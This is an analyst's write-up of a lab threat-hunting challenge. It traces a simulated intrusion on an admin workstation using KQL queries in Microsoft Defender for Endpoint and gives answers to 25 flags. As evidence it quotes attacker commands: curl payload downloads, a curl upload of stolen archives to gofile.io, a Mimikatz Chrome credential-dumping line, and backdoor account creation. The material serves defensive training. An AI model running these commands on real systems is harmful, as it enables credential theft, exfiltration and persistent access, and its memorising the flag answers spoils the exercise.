# SOC Challenge: Administrative Workstation Compromise — THE AZUKI BREACH SAGA PART 3: Bridge Takeover

![Threat Hunt](https://img.shields.io/badge/Threat_Hunt-Active-red) ![KQL](https://img.shields.io/badge/KQL-Advanced-blue) ![MITRE%20ATT%26CK](https://img.shields.io/badge/MITRE-ATT%26CK-orange)

**Analyst:** Tiernan Falcon  
**Date:** December 16th, 2025  
**Source:** CyberRange SOC Challenge  
**System:** azuki-adminpc  
**Platform:** Microsoft Defender for Endpoint

---

## 🎯 Skills Demonstrated

- **Kusto Query Language (KQL)** - Advanced queries for threat hunting and Base64 decoding
- **Microsoft Defender for Endpoint (MDE)** - Enterprise EDR platform
- **MITRE ATT&CK Framework** - Attack lifecycle mapping and TTP identification
- **Threat Hunting** - Proactive threat detection and lateral movement analysis
- **Incident Response** - C2 infrastructure identification and credential theft investigation
- **Digital Forensics** - Artifact analysis, named pipe detection, and anti-forensics techniques
- **Malware Analysis** - Meterpreter implant identification and LOLBin abuse detection
- **Security Operations** - Data exfiltration tracking and persistence mechanism analysis
- **Technical Documentation** - Professional security reporting and communication

---

## 📑 Table of Contents

1. [Executive Summary](#executive-summary)
2. [Attack Timeline](#attack-timeline)
3. [MITRE ATT&CK Mapping](#️-attack-lifecycle-mitre-attck-mapping)
4. [Technical Analysis](#-technical-analysis)
   - [Lateral Movement & Initial Access](#1-lateral-movement--initial-access)
   - [Execution & Malware Deployment](#2-execution--malware-deployment)
   - [Persistence: The Backdoor User](#3-persistence-the-backdoor-user)
   - [Discovery & Credential Theft](#4-discovery--credential-theft)
   - [Collection & Exfiltration](#5-collection--exfiltration)
5. [Indicators of Compromise](#️-indicators-of-compromise-iocs)
6. [Remediation & Recommendations](#-remediation--recommendations)
7. [Detailed Investigation & Flag Solutions](#️-detailed-investigation--flag-solutions)
   - [Flags 1-25: Step-by-Step Methodology](#-flag-1-lateral-movement---source-system)
8. [Reflections](#-reflections)

---

## 🛡️ Executive Summary

**Incident Date:** November 24-25, 2025  
**Analyst:** Tiernan Falcon  
**Tools Used:** Microsoft Defender for Endpoint (MDE), KQL (Kusto Query Language), Base64Decode

### Scenario

Following the initial breach of the Azuki file server, threat actors pivoted laterally to a high-value administrative workstation. The attacker employed sophisticated techniques including "Living off the Land" binaries (LOLBins), custom C2 implants (Meterpreter), and credential dumping tools to exfiltrate critical financial data and master passwords.

### Findings

The investigation confirmed that the attacker moved laterally via RDP from the previously compromised file server (`10.1.0.204`). They established persistence using a backdoor local administrator account and a Meterpreter C2 implant. Significant data exfiltration occurred via `gofile.io`, including KeePass databases, browser credentials, and financial records. The attacker demonstrated a high level of intent, specifically targeting credentials and financial data (Espionage/Theft) rather than just encryption (Ransomware).

---

<!-- ## ⏱️ Attack Timeline  need to fix 

| Timestamp | Phase | Activity |
|-----------|-------|----------|
| **2025-11-25T04:06:52.7572947Z** | Lateral Movement | RDP pivot from compromised file server (`10.1.0.204`) to `azuki-adminpc` using `yuki.tanaka` credentials |
| **2025-11-25T04:21:11.7917432Z** | Execution | Downloaded fake Windows update `KB5044273-x64.7z` from `litter.catbox.moe` containing C2 payloads |
| **Nov 24, 2025** | Execution | Extracted password-protected archive containing `meterpreter.exe` using 7-Zip |
| **Nov 24, 2025** | Persistence | Deployed Meterpreter C2 implant creating named pipe `\Device\NamedPipe\msf-pipe-5902` |
| **Nov 24, 2025** | Persistence | Created backdoor admin account `yuki.tanaka2` via Base64-encoded PowerShell command |
| **Nov 24, 2025** | Persistence | Escalated backdoor account to Administrators group via encoded command |
| **Nov 25, 2025** | Discovery | Enumerated RDP sessions using `qwinsta.exe` |
| **Nov 25, 2025** | Discovery | Performed domain trust enumeration via `nltest.exe /domain_trusts /all_trusts` |
| **Nov 25, 2025** | Discovery | Mapped network connections using `netstat -ano` |
| **Nov 25, 2025** | Discovery | Hunted for KeePass databases using `where /r C:\Users *.kdbx` |
| **Nov 25, 2025** | Discovery | Located `OLD-Passwords.txt` and `KeePass-Master-Password.txt` in user directories |
| **Nov 25, 2025** | Credential Access | Downloaded credential theft tool `m-temp.7z` (Mimikatz) from `litter.catbox.moe` |
| **Nov 25, 2025** | Credential Access | Executed renamed Mimikatz (`m.exe`) to dump Chrome browser credentials via DPAPI |
| **Nov 25, 2025** | Collection | Staged data in hidden directory `C:\ProgramData\Microsoft\Crypto\staging` |
| **Nov 25, 2025** | Collection | Used `Robocopy.exe` to aggregate Banking, Financial, Tax, and Contract documents |
| **Nov 25, 2025** | Collection | Created 8 compressed archives of sensitive data |
| **Nov 25, 2025** | Exfiltration | Exfiltrated archives to `store1.gofile.io` (45.112.123.227) via `curl.exe` POST requests |
-->
---

## 🗺️ Attack Lifecycle (MITRE ATT&CK Mapping)

| Tactic | ID | Technique | Observation |
|--------|----|-----------| ------------|
| **Lateral Movement** | [T1021.001](https://attack.mitre.org/techniques/T1021/001/) | Remote Services: RDP | Pivoted from `10.1.0.204` to `azuki-adminpc` using compromised `yuki.tanaka` credentials. |
| **Execution** | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | Command and Scripting Interpreter: PowerShell | Downloaded fake update `KB5044273` containing C2 payloads via PowerShell. |
| **Persistence** | [T1136.001](https://attack.mitre.org/techniques/T1136/001/) | Create Account: Local Account | Created backdoor admin account `yuki.tanaka2` (hidden via Base64 encoding). |
| **Command and Control** | [T1090](https://attack.mitre.org/techniques/T1090/) | Proxy | Deployed `meterpreter.exe` creating named pipe `\Device\NamedPipe\msf-pipe-5902`. |
| **Discovery** | [T1083](https://attack.mitre.org/techniques/T1083/) | File and Directory Discovery | Used `where /r` to hunt for KeePass (`.kdbx`) databases across user directories. |
| **Discovery** | [T1049](https://attack.mitre.org/techniques/T1049/) | System Network Connections Discovery | Used `netstat -ano` to enumerate active network connections. |
| **Discovery** | [T1482](https://attack.mitre.org/techniques/T1482/) | Domain Trust Discovery | Executed `nltest /domain_trusts /all_trusts` for domain enumeration. |
| **Credential Access** | [T1555.003](https://attack.mitre.org/techniques/T1555/003/) | Credentials from Password Stores: Credentials from Web Browsers | Renamed Mimikatz (`m.exe`) to dump Chrome Login Data using DPAPI module. |
| **Collection** | [T1119](https://attack.mitre.org/techniques/T1119/) | Automated Collection | Staged data in `C:\ProgramData\Microsoft\Crypto\staging` using `Robocopy /E`. |
| **Exfiltration** | [T1567.002](https://attack.mitre.org/techniques/T1567/002/) | Exfiltration Over Web Service: Exfiltration to Cloud Storage | Exfiltrated 8 archives to `store1.gofile.io` via `curl -X POST -F file=@`. |

---

## 🔎 Technical Analysis

### 1. Lateral Movement & Initial Access

The attacker leveraged the compromised file server to RDP into the Admin PC, continuing their campaign against Azuki Import/Export's infrastructure.

**Key Evidence:**

- **Source IP:** `10.1.0.204` (Previously compromised file server)
- **Target:** `azuki-adminpc`
- **Compromised Account:** `yuki.tanaka`
- **Method:** Remote Desktop Protocol (RDP)

**KQL Query Used:**

```kql
DeviceLogonEvents
| where DeviceName == "azuki-adminpc"
| where LogonType == "RemoteInteractive"
| where Timestamp >= datetime(2025-11-24)
| project Timestamp, RemoteIP, AccountName, DeviceName
```

---

### 2. Execution & Malware Deployment

The attacker downloaded a file masquerading as a Windows Update (`KB5044273-x64.7z`) from a suspicious domain (`litter.catbox.moe`). This password-protected archive contained the C2 implant `meterpreter.exe`.

**Key Evidence:**

- **Download Command:** `curl.exe -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z`
- **Extraction Command:** `7z.exe x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y`
- **C2 Implant:** `meterpreter.exe`
- **IOC (Named Pipe):** `\Device\NamedPipe\msf-pipe-5902`

**KQL Query Used:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where ProcessCommandLine contains "http"
| where FileName in~ ("curl.exe", "wget.exe", "powershell.exe")
| project Timestamp, ProcessCommandLine, FileName
```

---

### 3. Persistence: The Backdoor User

To maintain access, the attacker created a local user and added them to the Administrators group. The commands were obfuscated using PowerShell Base64 encoding to evade detection.

**Key Evidence:**

- **Encoded Command 1:** `powershell.exe -EncodedCommand bgBlAHQ...`
- **Decoded Action:** `net user yuki.tanaka2 B@ckd00r2024! /add`
- **Encoded Command 2:** Second Base64 string for privilege escalation
- **Escalation:** `net localgroup Administrators yuki.tanaka2 /add`

**KQL Query Used:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where ProcessCommandLine contains "-EncodedCommand"
| project Timestamp, ProcessCommandLine, FileName
```

---

### 4. Discovery & Credential Theft

The attacker performed aggressive discovery for password management files and credential stores, demonstrating clear intent to harvest authentication materials.

**Discovery Activities:**

- **Network Mapping:** `netstat -ano`
- **RDP Session Enumeration:** `qwinsta.exe`
- **Domain Trust Discovery:** `nltest.exe /domain_trusts /all_trusts`
- **File Hunting:** `cmd.exe /c where /r C:\Users *.kdbx`

**Credential Theft:**

- Found `OLD-Passwords.txt` and `KeePass-Master-Password.txt` in user directories
- Downloaded secondary tool `m-temp.7z` containing Mimikatz
- **Browser Credential Theft Command:** `"m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit`

**KQL Query Used:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where ProcessCommandLine contains "chrome" and ProcessCommandLine contains "dpapi"
| project Timestamp, ProcessCommandLine, FileName
```

---

### 5. Collection & Exfiltration

Data was aggregated into a hidden staging directory before being compressed and uploaded to an external cloud storage service.

**Key Evidence:**

- **Staging Path:** `C:\ProgramData\Microsoft\Crypto\staging`
- **Collection Tool:** `Robocopy.exe C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP`
- **Volume:** 8 distinct archives (Financial, Tax, Contracts, Banking, Credentials)
- **Exfiltration Command:** `curl.exe -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile`
- **Destination IP:** `45.112.123.227`
- **Exfiltration Service:** `gofile.io`

**KQL Query Used:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where ProcessCommandLine contains "curl" and ProcessCommandLine contains "POST"
| project Timestamp, ProcessCommandLine, FileName
```

---

## 🛡️ Indicators of Compromise (IOCs)

### Network Indicators:

- **Internal Pivot:** `10.1.0.204` (Compromised File Server)
- **Exfiltration IP:** `45.112.123.227`
- **Malware Hosting:** `litter.catbox.moe`
- **Exfiltration Domain:** `store1.gofile.io`

### File Indicators:

- **C2 Implant:** `meterpreter.exe`
- **Credential Dumper:** `m.exe` (Renamed Mimikatz)
- **Backdoor Archive:** `KB5044273-x64.7z`
- **Credential Tool:** `m-temp.7z`

### Account Indicators:

- **Backdoor Account:** `yuki.tanaka2`
- **Compromised Account:** `yuki.tanaka`

### System Indicators:

- **Named Pipe:** `\Device\NamedPipe\msf-pipe-5902`
- **Staging Directory:** `C:\ProgramData\Microsoft\Crypto\staging`
- **Download Cache:** `C:\Windows\Temp\cache`

---

## 💡 Remediation & Recommendations

Based on the findings, the following actions are recommended to contain and remediate the threat:

1. **Immediate Containment:**
   - Isolate `azuki-adminpc` and `10.1.0.204` from the network immediately
   - Terminate all active sessions for compromised accounts

2. **Account Remediation:**
   - Disable and delete the backdoor account `yuki.tanaka2`
   - Force password reset for `yuki.tanaka` and all admin accounts
   - Reset passwords for all accounts stored in the stolen KeePass database
   - Reset all Chrome browser-stored credentials for affected users
   - Reset KRBTGT account twice (due to potential Kerberos ticket theft)

3. **Network Hygiene:**
   - Block outbound traffic to file sharing sites (`catbox.moe`, `gofile.io`)
   - Block IP address `45.112.123.227` at perimeter firewall
   - Restrict RDP access to authorized jump hosts only
   - Implement application whitelisting for critical systems

4. **Detection Engineering:**
   - Create alert for `net user /add` commands executed via PowerShell encoded strings
   - Alert on `curl.exe` POST requests to known file-sharing domains
   - Monitor for creation of files in `C:\ProgramData\Microsoft\Crypto` by non-system processes
   - Alert on Base64-encoded PowerShell commands creating local accounts
   - Monitor for named pipe creation by suspicious processes
   - Alert on `7z.exe` extracting password-protected archives in system directories

5. **Forensic Preservation:**
   - Preserve memory dumps and disk images of `azuki-adminpc`
   - Collect all logs from `10.1.0.204` and `azuki-adminpc`
   - Preserve network flow data for correlation analysis

6. **Long-term Improvements:**
   - Implement MFA for all administrative accounts
   - Deploy EDR with behavioral analytics across all endpoints
   - Establish baseline behavioral profiles for administrative accounts
   - Conduct security awareness training on social engineering tactics

---

# 🔍 Detailed Investigation & Flag Solutions

This section documents the step-by-step investigation methodology. Each flag represents a specific stage in the attack lifecycle, uncovered using Kusto Query Language (KQL) in Microsoft Defender for Endpoint.

---

## 🚩 FLAG 1: LATERAL MOVEMENT - Source System

**Question:** Identify the source IP address for lateral movement to the admin PC?  
**Answer:** `10.1.0.204`

**Thought Process:**  
I investigated RDP (`RemoteInteractive`) logins to devices containing "admin" in the name around the start date (Nov 24). This would reveal which system the attacker pivoted from, found at 2025-11-25T04:06:52.7572947Z.

**KQL Query:**

```kql
DeviceLogonEvents
| where DeviceName == "azuki-adminpc"
| where LogonType == "RemoteInteractive"
| where Timestamp >= datetime(2025-11-24)
| project Timestamp, RemoteIP, AccountName
| order by Timestamp asc
```
I confirmed the connection from the previously compromised device, azuki-sl. You can see in the original query the suspicious remote IP login to azuki-sl at 2025-11-25T04:00:40.9639268Z.

```kql
DeviceNetworkInfo
| where Timestamp >= datetime(2025-11-24)
| where IPAddresses contains "10.1.0.204"
| distinct DeviceName
```

---

## 🚩 FLAG 2: LATERAL MOVEMENT - Compromised Credentials

**Question:** Identify the compromised account used for lateral movement?  
**Answer:** `yuki.tanaka`

**Thought Process:**  
Using the same query as Flag 1, I identified the user account associated with the suspicious RDP session from the compromised file server.

---

## 🚩 FLAG 3: LATERAL MOVEMENT - Target Device

**Question:** What is the target device name?  
**Answer:** `azuki-adminpc`

**Thought Process:**  
Using the same query as Flag 1, I confirmed the hostname of the victim machine receiving the RDP connection.

---

## 🚩 FLAG 4: EXECUTION - Payload Hosting Service

**Question:** What file hosting service was used to stage malware?  
**Answer:** `litter.catbox.moe`

**Thought Process:**  
I searched for `curl` or `wget` commands downloading files from the internet. The domain in the URL revealed the hosting service used by the attacker, found at 2025-11-25T04:21:11.7917432Z.

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where ProcessCommandLine contains "http"
| where FileName in~ ("curl.exe", "wget.exe", "powershell.exe")
| project Timestamp, ProcessCommandLine
| order by Timestamp asc
```

---

## 🚩 FLAG 5: EXECUTION - Malware Download Command

**Question:** What command was used to download the malicious archive?  
**Answer:** `"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z`

**Thought Process:**  
Found via the query for Flag 4. The attacker disguised the malware as a Windows Update (KB file) to blend in with legitimate system activity.

---

## 🚩 FLAG 6: EXECUTION - Archive Extraction Command

**Question:** Identify the command used to extract the password-protected archive?  
**Answer:** `"7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y`

**Thought Process:**  
I looked for compression tools interacting with the downloaded file. The password-protected archive required the attacker to provide credentials during extraction, found at 2025-11-25T04:21:32.2579357Z.

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where FileName has_any ("7z", "rar", "tar")
| project ProcessCommandLine
```

---

## 🚩 FLAG 7: PERSISTENCE - C2 Implant

**Question:** Identify the C2 beacon filename?  
**Answer:** `meterpreter.exe`

**Thought Process:**  
I investigated files created in the staging directory (`C:\Windows\Temp\cache`) shortly after extraction. Executable files appearing after the archive extraction are highly suspicious. 
Suspicions are confirmed because meterpreter is a payload from the Metasploit Framework, found at 2025-11-25T04:21:33.118662Z

**KQL Query:**

```kql
DeviceFileEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where FolderPath contains "Temp\\cache"
| where FileName endswith ".exe"
| project Timestamp, FileName
| order by Timestamp asc
```

---

## 🚩 FLAG 8: PERSISTENCE - Named Pipe

**Question:** Identify the named pipe created by the C2 implant?  
**Answer:** `\Device\NamedPipe\msf-pipe-5902`

**Thought Process:**  
Meterpreter often uses named pipes for communication between the implant and the handler. I searched `DeviceEvents` for pipe creation events linked to the malware, and found one shortly after the extraction at 2025-11-25T04:24:35.3398583Z

**KQL Query:**

```kql
DeviceEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where ActionType == "NamedPipeEvent"
| where InitiatingProcessFileName =~ "meterpreter.exe"
| extend PipeName = parse_json(AdditionalFields).PipeName
| project Timestamp, PipeName
```

---

## 🚩 FLAG 9: CREDENTIAL ACCESS - Decoded Account Creation

**Question:** What is the decoded Base64 command?  
**Answer:** `net user yuki.tanaka2 B@ckd00r2024! /add`

**Thought Process:**  
I found obfuscated PowerShell commands (`powershell -EncodedCommand ...`), starting at 2025-11-25T04:51:08.9068069Z. Decoding the Base64 string revealed the `net user` command creating a backdoor account.

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where ProcessCommandLine contains "-EncodedCommand"
| project Timestamp, ProcessCommandLine
```

---

## 🚩 FLAG 10: PERSISTENCE - Backdoor Account

**Question:** Identify the backdoor account name?  
**Answer:** `yuki.tanaka2`

**Thought Process:**  
Derived directly from the decoded command in Flag 9. The account name mimics a legitimate user (`yuki.tanaka`) to blend in.

---

## 🚩 FLAG 11: PERSISTENCE - Decoded Privilege Escalation Command

**Question:** What is the decoded Base64 command for privilege escalation?  
**Answer:** `net localgroup Administrators yuki.tanaka2 /add`

**Thought Process:**  
Found by decoding the second Base64 PowerShell command executed immediately after the account creation. This elevated the backdoor account to Administrator privileges.

---

## 🚩 FLAG 12: DISCOVERY - Session Enumeration

**Question:** What command was used to enumerate RDP sessions?  
**Answer:** `qwinsta.exe`

**Thought Process:**  
I searched for standard Windows discovery commands. `qwinsta` (Query Window Station) is used to see who is logged in and via which session type, found at 2025-11-25T04:08:58.5854766Z

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where FileName in~ ("qwinsta.exe", "quser.exe")
| project Timestamp, ProcessCommandLine, FileName
```

---

## 🚩 FLAG 13: DISCOVERY - Domain Trust Enumeration

**Question:** Identify the command used to enumerate domain trusts?  
**Answer:** `"nltest.exe" /domain_trusts /all_trusts`

**Thought Process:**  
`nltest` is the standard Windows tool for enumerating domain trust relationships. This indicates the attacker was mapping the Active Directory environment for potential lateral movement targets, found at 2025-11-25T04:09:25.4429368Z

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where FileName =~ "nltest.exe"
| project Timestamp, ProcessCommandLine, FileName
```

---

## 🚩 FLAG 14: DISCOVERY - Network Connection Enumeration

**Question:** What command was used to enumerate network connections?  
**Answer:** `netstat -ano`

**Thought Process:**  
`netstat -ano` is the standard command for listing active network connections with associated process IDs. Attackers use this to understand what services are running and identify potential targets, found at 2025-11-25T04:10:07.805432Z

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where FileName =~ "netstat.exe"
| project Timestamp, ProcessCommandLine, FileName
```

---

## 🚩 FLAG 15: DISCOVERY - Password Database Search

**Question:** What command was used to search for password databases?  
**Answer:** `where /r C:\Users *.kdbx`

**Thought Process:**  
I looked for commands searching for file extensions like `.kdbx` (KeePass database files). The `where /r` command recursively searches directories. One was discovered at 2025-11-25T04:13:45.8171756Z

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where ProcessCommandLine contains "kdbx" or ProcessCommandLine contains "password"
| where ProcessCommandLine contains "where"
| project Timestamp, ProcessCommandLine, FileName
| order by Timestamp asc
```

---

## 🚩 FLAG 16: DISCOVERY - Credential File

**Question:** Identify the discovered password file?  
**Answer:** `OLD-Passwords.txt`

**Thought Process:**  
I checked for file access in the user's Desktop/Documents. The creation of `OLD-Passwords.lnk` in the `Recent` folder confirmed the attacker accessed this text file containing legacy credentials, found at 2025-11-25T04:15:57.3989346Z

**KQL Query:**

```kql
DeviceFileEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where FolderPath contains "Recent" and FileName endswith ".lnk"
| where FileName contains "password"
| project Timestamp, FileName, FolderPath
| order by Timestamp asc
```

---

## 🚩 FLAG 17: COLLECTION - Data Staging Directory

**Question:** Identify the data staging directory?  
**Answer:** `C:\ProgramData\Microsoft\Crypto\staging`

**Thought Process:**  
I tracked where `Robocopy` was moving files to, and where compression tools like `7z` or `tar` were creating archives, beginning at 2025-11-25T04:39:16.4900877Z. The attacker chose a somewhat legitimate-sounding system path to hide their staging area.

**KQL Query:**

```kql
DeviceFileEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where FileName endswith ".tar.gz"
| project Timestamp, FolderPath, FileName
| order by Timestamp asc
```

---

## 🚩 FLAG 18: COLLECTION - Automated Data Collection Command

**Question:** Identify the command used to copy banking documents?  
**Answer:** `"Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP`

**Thought Process:**  
I searched for `robocopy` or `xcopy` commands targeting the staging directory found in Flag 17 and found a banking one at 2025-11-25T04:37:03.0075513Z. The `/E` flag copies subdirectories including empty ones, indicating comprehensive data collection.

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where FileName =~ "robocopy.exe"
| project Timestamp, ProcessCommandLine, FileName
```

---

## 🚩 FLAG 19: COLLECTION - Exfiltration Volume

**Question:** Identify the total number of archives created?  
**Answer:** `8`

**Thought Process:**  
I counted the unique `.tar.gz` and `.zip` files created in the crypto staging directories. Each archive represented a different category of stolen data (Financial, Tax, Contracts, Banking, Credentials, etc.).

**KQL Query:**

```kql
DeviceFileEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where FolderPath contains "crypto"
| where FileName endswith ".tar.gz" or FileName endswith ".zip"
```

---

## 🚩 FLAG 20: CREDENTIAL ACCESS - Credential Theft Tool Download

**Question:** What command was used to download the credential theft tool?  
**Answer:** `"curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z`

**Thought Process:**  
I looked for a second `curl` download occurring later in the timeline, found at 2025-11-25T05:55:34.5280119Z. The file `m-temp.7z` (containing Mimikatz) was retrieved from the same hosting service used for the initial malware.

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where FileName =~ "curl.exe"
| where ProcessCommandLine contains "-o" or ProcessCommandLine contains "download"
| project Timestamp, ProcessCommandLine, FileName
| order by Timestamp asc
```
You can see the extraction process at 2025-11-25T05:55:44.3817231Z

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where FileName =~ "7z.exe"
| where ProcessCommandLine contains "m-temp"
| project Timestamp, ProcessCommandLine, FileName
```

The obfuscated Mimikatz exe at 2025-11-25T05:55:44.7282207Z

```kql
DeviceFileEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where FileName =~ "m.exe"
| where ActionType == "FileCreated"
| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessFileName
```

And the confirmation that it is indeed the malicious Mimikatz via this query.

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where FileName =~ "m.exe"
| project Timestamp, FileName, ProcessVersionInfoOriginalFileName, ProcessVersionInfoProductName
```

---

## 🚩 FLAG 21: CREDENTIAL ACCESS - Browser Credential Theft

**Question:** What command was used for browser credential theft?  
**Answer:** `"m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit`

**Thought Process:**  
I looked for the execution of the tool extracted from `m-temp.7z`. The attacker renamed Mimikatz to `m.exe` and ran the DPAPI Chrome module to decrypt stored browser passwords with /unprotect, found at 2025-11-25T05:55:54.858525Z

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where ProcessCommandLine contains "chrome" and ProcessCommandLine contains "dpapi"
| project Timestamp, ProcessCommandLine, FileName
```

---

## 🚩 FLAG 22: EXFILTRATION - Data Upload Command

**Question:** Identify the command used to exfiltrate the first archive?  
**Answer:** `"curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile`

**Thought Process:**  
I searched for `curl` commands performing POST requests to external domains, the first of which is found at 2025-11-25T04:41:51.7723427Z. The `-F` flag indicates form-based file upload.

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where ProcessCommandLine contains "curl" and ProcessCommandLine contains "POST"
| project Timestamp, ProcessCommandLine, FileName
```

---

## 🚩 FLAG 23: EXFILTRATION - Cloud Storage Service

**Question:** Identify the exfiltration service domain?  
**Answer:** `gofile.io`

**Thought Process:**  
Extracted from the URL in Flag 22 (`store1.gofile.io`). GoFile is a free file hosting service commonly abused by threat actors for data exfiltration.

---

## 🚩 FLAG 24: EXFILTRATION - Destination Server

**Question:** Identify the exfiltration server IP address?  
**Answer:** `45.112.123.227`

**Thought Process:**  
I queried network events for connections to the `gofile.io` domain to identify the actual IP address the data was sent to.

**KQL Query:**

```kql
DeviceNetworkEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where RemoteUrl contains "gofile.io"
| project Timestamp, RemoteIP, RemoteUrl
```

---

## 🚩 FLAG 25: CREDENTIAL ACCESS - Master Password Extraction

**Question:** What file contains the extracted master password?  
**Answer:** `KeePass-Master-Password.txt`

**Thought Process:**  
I analyzed the contents of the `credentials.tar.gz` archive creation command. The attacker explicitly bundled this text file with the stolen KeePass database, providing them with complete access to all stored passwords.

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where Timestamp >= datetime(2025-11-24)
| where ProcessCommandLine contains "tar"
| where ProcessCommandLine has_any ("master", "password", "keepass")
| project Timestamp, ProcessCommandLine, FileName
```

---

## 💡 Reflections

This scenario demonstrated a high level of attacker sophistication and intent. Unlike typical ransomware operators who encrypt files for financial gain, this threat actor specifically targeted credentials and financial data, indicating espionage or theft motivations.

### Key Takeaways

1. **Base64 Obfuscation is Common:** Attackers frequently use Base64 encoding to hide malicious commands from casual observation. Decoding encoded PowerShell commands is essential for understanding attacker actions.

2. **Named Pipes for C2:** Meterpreter's use of named pipes for command and control communication demonstrates advanced post-exploitation techniques. Monitoring `NamedPipeEvent` can reveal sophisticated malware.

3. **LOLBins Everywhere:** The attacker used native Windows tools (`curl`, `certutil`, `robocopy`, `tar`, `7z`) extensively. This "Living off the Land" approach bypasses traditional signature-based detection.

4. **Credential Theft Focus:** The explicit targeting of KeePass databases, browser credentials, and password text files indicates this was a targeted operation, not opportunistic malware.

5. **Masquerading is Effective:** Renaming Mimikatz to `m.exe` and disguising malware as Windows updates (`KB5044273`) shows how attackers leverage user and system trust.

6. **Persistence Mechanisms Vary:** The combination of a backdoor user account and a C2 implant provides redundant access methods, making complete remediation more challenging.

7. **Data Staging Patterns:** The creation of a hidden staging directory (`C:\ProgramData\Microsoft\Crypto\staging`) followed by systematic collection and compression is a clear pattern that can be detected with proper behavioral analytics.

8. **Multiple Exfiltration Archives:** Creating 8 separate archives suggests the attacker was organizing stolen data by category, indicating a methodical and professional operation.

---

**End of Report**
